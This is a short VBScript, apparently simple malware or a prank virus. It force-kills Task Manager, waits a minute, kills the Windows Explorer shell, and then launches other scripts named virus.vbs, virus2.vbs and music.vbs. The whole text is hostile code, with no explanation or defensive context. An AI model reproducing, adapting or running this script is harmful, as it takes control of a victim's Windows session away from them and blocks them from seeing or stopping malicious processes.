set t=CreateObject("Wscript.Shell")
t.run "taskkill -f -im taskmgr.exe"
wscript.sleep 60000
t.run "taskkill -f -im explorer.exe"
t.run "virus.vbs"
t.run "virus2.vbs"
t.run "music.vbs"